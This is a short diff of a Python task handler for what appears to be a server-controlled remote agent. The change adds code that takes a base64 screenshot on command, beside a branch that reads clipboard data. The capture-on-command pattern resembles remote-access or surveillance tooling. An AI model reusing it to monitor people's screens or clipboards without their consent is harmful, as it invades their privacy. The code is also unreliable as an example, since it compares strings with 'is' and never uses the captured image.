@@ -9,6 +9,14 @@ import threading
 
 from Providers.DeviceInfoProvider import DeviceInfoProvider
 
+"""
+    TODO:
+    -----
+    1. Finish initial basic tasks in agent side
+    2. Finish task management on server side
+    3. Test with randomly tasks to see if it works
+"""
+
 class TaskManagmentHandler():
     # Handle tasks from server
 
@@ -39,7 +47,10 @@ class TaskManagmentHandler():
                     pass
                 elif taskResponse["task"] is "screenshot":
                     # Take screenshot
-                    pass
+                    from Providers import ScreenshotProvider
+
+                    scProvider = ScreenshotProvider
+                    base64Image = scProvider.getBase64Screenshot()
                 elif taskResponse["task"] is "clipboard":
                     # Get clipboard data
                     devInfoProvider = DeviceInfoProvider()
